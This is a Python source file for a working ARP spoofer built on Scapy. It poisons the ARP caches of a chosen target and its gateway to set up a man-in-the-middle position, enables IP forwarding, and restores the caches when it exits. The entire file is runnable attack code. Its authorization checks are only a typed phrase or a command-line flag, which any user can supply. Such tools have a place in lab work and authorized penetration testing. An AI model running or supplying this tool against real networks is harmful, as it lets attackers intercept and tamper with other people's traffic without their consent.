#!/usr/bin/env python3
"""ARP spoofer for authorized network security testing.

This tool places the host running it in the middle of the traffic between a
target machine and its gateway by poisoning both parties' ARP caches (a
classic man-in-the-middle position). It is intended purely for use in labs and
on networks you own or are explicitly authorized to test.

It does NOT capture, inspect, log, or store any intercepted traffic. It only
performs the ARP poisoning and restores the network to its original state on
exit.

Author:  dannyj1202
License: MIT (see the LICENSE file)
"""

from __future__ import annotations

import argparse
import ipaddress
import logging
import os
import platform
import sys
import time

# Silence Scapy's noisy runtime/IPv6 warnings *before* importing it.
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import scapy.all as scapy  # noqa: E402  (import after log config is intentional)

# --------------------------------------------------------------------------- #
# Constants (no magic numbers scattered through the logic)
# --------------------------------------------------------------------------- #
SLEEP_INTERVAL_SECONDS: float = 2.0
GET_MAC_TIMEOUT_SECONDS: float = 2.0
GET_MAC_RETRIES: int = 3
RESTORE_PACKET_COUNT: int = 4
ARP_REPLY_OP: int = 2  # op=2 is an ARP "is-at" reply
BROADCAST_MAC: str = "ff:ff:ff:ff:ff:ff"
LINUX_IP_FORWARD_PATH: str = "/proc/sys/net/ipv4/ip_forward"

EXIT_OK: int = 0
EXIT_ERROR: int = 1

LOGGER = logging.getLogger("arp_spoofer")

BANNER: str = r"""
+--------------------------------------------------------------+
|                      ARP Spoofer (MITM)                      |
|          For AUTHORIZED security testing ONLY                |
+--------------------------------------------------------------+
"""

DISCLAIMER: str = (
    "LEGAL / ETHICAL NOTICE\n"
    "This tool poisons ARP caches to intercept traffic. Running it against\n"
    "hosts or networks you do not own or lack written authorization to test\n"
    "is illegal in most jurisdictions. You are solely responsible for how\n"
    "you use it. Use it only in a lab or an authorized engagement.\n"
)


# --------------------------------------------------------------------------- #
# Setup / environment helpers
# --------------------------------------------------------------------------- #
def configure_logging(verbose: bool) -> None:
    """Configure the module logger.

    Args:
        verbose: When True, emit DEBUG-level output; otherwise INFO.
    """
    level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(
        level=level,
        format="%(asctime)s [%(levelname)s] %(message)s",
        datefmt="%H:%M:%S",
    )


def is_root() -> bool:
    """Return True if the process is running with root privileges."""
    # getuid is POSIX-only; treat its absence (e.g. Windows) as "not root".
    return hasattr(os, "geteuid") and os.geteuid() == 0


def require_root() -> None:
    """Exit with a helpful message if not running as root."""
    if not is_root():
        LOGGER.error(
            "Root privileges are required to send raw ARP packets and toggle "
            "IP forwarding. Re-run with: sudo %s ...",
            os.path.basename(sys.argv[0]),
        )
        sys.exit(EXIT_ERROR)


# --------------------------------------------------------------------------- #
# Input validation
# --------------------------------------------------------------------------- #
def valid_ip(value: str) -> str:
    """argparse type: validate that *value* is a well-formed IPv4/IPv6 address.

    Args:
        value: The raw CLI argument.

    Returns:
        The normalized string form of the address.

    Raises:
        argparse.ArgumentTypeError: If *value* is not a valid IP address.
    """
    try:
        return str(ipaddress.ip_address(value))
    except ValueError as exc:
        raise argparse.ArgumentTypeError(f"'{value}' is not a valid IP address") from exc


# --------------------------------------------------------------------------- #
# ARP / network primitives
# --------------------------------------------------------------------------- #
def get_mac(ip: str, retries: int = GET_MAC_RETRIES) -> str | None:
    """Resolve the MAC address for *ip* via an ARP request.

    Args:
        ip: The IP address to resolve.
        retries: How many times to retry before giving up.

    Returns:
        The MAC address string, or None if the host did not answer.
    """
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst=BROADCAST_MAC)
    arp_request_broadcast = broadcast / arp_request

    for attempt in range(1, retries + 1):
        answered_list = scapy.srp(
            arp_request_broadcast,
            timeout=GET_MAC_TIMEOUT_SECONDS,
            verbose=False,
        )[0]
        if answered_list:
            return answered_list[0][1].hwsrc
        LOGGER.debug("No ARP reply for %s (attempt %d/%d)", ip, attempt, retries)

    return None


def resolve_or_exit(ip: str, role: str) -> str:
    """Resolve *ip* to a MAC or exit with a clear error.

    Args:
        ip: The IP address to resolve.
        role: Human-readable label ("target" / "gateway") for the message.

    Returns:
        The resolved MAC address.
    """
    mac = get_mac(ip)
    if mac is None:
        LOGGER.error(
            "Could not resolve a MAC for the %s (%s). Is it online and on the "
            "same subnet as this machine?",
            role,
            ip,
        )
        sys.exit(EXIT_ERROR)
    LOGGER.debug("%s %s is at %s", role.capitalize(), ip, mac)
    return mac


def detect_gateway() -> str | None:
    """Auto-detect the default gateway from the routing table via Scapy.

    Returns:
        The gateway IP as a string, or None if it cannot be determined.
    """
    try:
        # route(dst) -> (interface, outgoing_ip, gateway)
        gateway = scapy.conf.route.route("0.0.0.0")[2]
    except Exception as exc:  # noqa: BLE001 - scapy can raise a variety of errors
        LOGGER.debug("Gateway auto-detection failed: %s", exc)
        return None

    if not gateway or gateway == "0.0.0.0":
        return None
    return gateway


# --------------------------------------------------------------------------- #
# IP forwarding management (so intercepted traffic still reaches its dest)
# --------------------------------------------------------------------------- #
def enable_ip_forwarding() -> str | None:
    """Enable IPv4 forwarding, returning the previous value for later restore.

    Only implemented for Linux (the standard platform for this tooling). On
    other platforms it logs a warning and returns None.

    Returns:
        The original ip_forward value ("0"/"1"), or None if unmanaged.
    """
    if platform.system() != "Linux":
        LOGGER.warning(
            "Automatic IP forwarding is only managed on Linux; enable it "
            "manually on %s if you need transparent forwarding.",
            platform.system(),
        )
        return None

    try:
        with open(LINUX_IP_FORWARD_PATH, "r", encoding="ascii") as handle:
            original = handle.read().strip()
        with open(LINUX_IP_FORWARD_PATH, "w", encoding="ascii") as handle:
            handle.write("1\n")
        LOGGER.debug("IP forwarding enabled (was %s)", original)
        return original
    except OSError as exc:
        LOGGER.error("Failed to enable IP forwarding: %s", exc)
        return None


def restore_ip_forwarding(original: str | None) -> None:
    """Restore IPv4 forwarding to its original value.

    Args:
        original: The value returned by :func:`enable_ip_forwarding`.
    """
    if original is None or platform.system() != "Linux":
        return
    try:
        with open(LINUX_IP_FORWARD_PATH, "w", encoding="ascii") as handle:
            handle.write(f"{original}\n")
        LOGGER.debug("IP forwarding restored to %s", original)
    except OSError as exc:
        LOGGER.error("Failed to restore IP forwarding: %s", exc)


# --------------------------------------------------------------------------- #
# Spoof / restore
# --------------------------------------------------------------------------- #
def spoof(target_ip: str, target_mac: str, spoof_ip: str, interface: str | None) -> None:
    """Tell *target_ip* that *spoof_ip* is at our MAC (poison one direction).

    Args:
        target_ip: The victim being lied to.
        target_mac: The victim's real MAC address.
        spoof_ip: The IP we are impersonating (usually the gateway or target).
        interface: Optional network interface to send on.
    """
    packet = scapy.ARP(op=ARP_REPLY_OP, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, iface=interface, verbose=False)


def restore(destination_ip: str, source_ip: str, interface: str | None) -> None:
    """Send correct ARP replies to heal *destination_ip*'s cache for *source_ip*.

    Args:
        destination_ip: The host whose ARP cache we are correcting.
        source_ip: The host whose real MAC we are re-advertising.
        interface: Optional network interface to send on.
    """
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if destination_mac is None or source_mac is None:
        LOGGER.warning(
            "Could not fully restore ARP cache for %s <- %s (host offline?). "
            "Caches will self-heal on their normal ARP timeout.",
            destination_ip,
            source_ip,
        )
        return
    packet = scapy.ARP(
        op=ARP_REPLY_OP,
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac,
    )
    scapy.send(packet, count=RESTORE_PACKET_COUNT, iface=interface, verbose=False)


# --------------------------------------------------------------------------- #
# CLI
# --------------------------------------------------------------------------- #
def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    """Parse command-line arguments.

    Args:
        argv: Optional argument list (defaults to sys.argv).

    Returns:
        The parsed arguments namespace.
    """
    parser = argparse.ArgumentParser(
        prog="arp_spoofer.py",
        description="ARP spoofer for AUTHORIZED man-in-the-middle testing.",
        epilog="Example: sudo ./arp_spoofer.py -t 192.168.1.10 --i-am-authorized",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "-t", "--target", required=True, type=valid_ip,
        help="Target (victim) IP address.",
    )
    parser.add_argument(
        "-g", "--gateway", type=valid_ip, default=None,
        help="Gateway (router) IP. Auto-detected from the routing table if omitted.",
    )
    parser.add_argument(
        "-i", "--interface", default=None,
        help="Network interface to use (e.g. eth0, wlan0). Defaults to Scapy's choice.",
    )
    parser.add_argument(
        "-v", "--verbose", action="store_true",
        help="Enable verbose (DEBUG) logging.",
    )
    parser.add_argument(
        "--i-am-authorized", action="store_true",
        help="Confirm you have authorization to test the target network. "
             "Required to run.",
    )
    return parser.parse_args(argv)


def confirm_authorization(pre_confirmed: bool) -> None:
    """Ensure the operator has affirmed authorization, or exit.

    Args:
        pre_confirmed: True if the --i-am-authorized flag was passed.
    """
    if pre_confirmed:
        return
    try:
        answer = input(
            "Type 'I am authorized' to confirm you may test this network: "
        ).strip().lower()
    except (EOFError, KeyboardInterrupt):
        answer = ""
    if answer != "i am authorized":
        LOGGER.error("Authorization not confirmed. Exiting.")
        sys.exit(EXIT_ERROR)


def main(argv: list[str] | None = None) -> int:
    """Program entry point.

    Args:
        argv: Optional argument list (used for testing).

    Returns:
        Process exit code.
    """
    args = parse_args(argv)
    configure_logging(args.verbose)

    print(BANNER)
    print(DISCLAIMER)

    require_root()
    confirm_authorization(args.i_am_authorized)

    gateway_ip = args.gateway or detect_gateway()
    if gateway_ip is None:
        LOGGER.error(
            "No gateway supplied and auto-detection failed. Provide one with -g."
        )
        return EXIT_ERROR

    if gateway_ip == args.target:
        LOGGER.error("Target and gateway cannot be the same address.")
        return EXIT_ERROR

    LOGGER.info("Target : %s", args.target)
    LOGGER.info("Gateway: %s", gateway_ip)

    # Resolve both MACs up front; exit cleanly if either host is unreachable.
    target_mac = resolve_or_exit(args.target, "target")
    gateway_mac = resolve_or_exit(gateway_ip, "gateway")

    original_forwarding = enable_ip_forwarding()
    sent_packets = 0

    try:
        LOGGER.info("Poisoning started. Press Ctrl+C to stop and restore.")
        while True:
            spoof(args.target, target_mac, gateway_ip, args.interface)
            spoof(gateway_ip, gateway_mac, args.target, args.interface)
            sent_packets += 2
            # \r keeps the counter on one line; not routed through logging on purpose.
            print(f"\r[+] Packets sent: {sent_packets}", end="", flush=True)
            time.sleep(SLEEP_INTERVAL_SECONDS)
    except KeyboardInterrupt:
        print()  # break the carriage-return line
        LOGGER.info("Ctrl+C detected. Restoring ARP tables...")
    finally:
        restore(args.target, gateway_ip, args.interface)
        restore(gateway_ip, args.target, args.interface)
        restore_ip_forwarding(original_forwarding)
        LOGGER.info("Network restored. Exiting cleanly.")

    return EXIT_OK


if __name__ == "__main__":
    sys.exit(main())
